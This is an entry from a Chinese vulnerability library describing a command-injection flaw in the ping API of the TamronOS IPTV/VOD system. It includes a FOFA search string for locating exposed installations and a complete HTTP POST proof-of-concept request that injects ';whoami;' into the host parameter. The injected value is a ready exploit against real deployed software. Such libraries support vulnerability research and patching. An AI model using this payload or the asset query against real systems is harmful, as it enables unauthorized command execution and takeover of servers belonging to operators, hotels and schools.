---

source: "wy876 漏洞文库"
---

# TamronOS IPTV系统ping存在命令执行漏洞

# 一、漏洞简介
TamronOS IPTV/VOD系统是一套基于Linux内核开发的宽带运营商、酒店、学校直播点播一体解决方案。系统提供了多种客户端（Android机顶盒、电视、PC版点播、手机版点播）方便用户通过不同的设备接入。TamronOS IPTV系统ping存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ TamronOS IPTV系统

# 三、资产测绘
+ fofa`app="TamronOS-IPTV系统"`
+ 特征


# 四、漏洞复现
```plain
POST /api/ping?count=5&host=;whoami; HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0
Connection: close

```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zy6y35t0g2nad6dw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
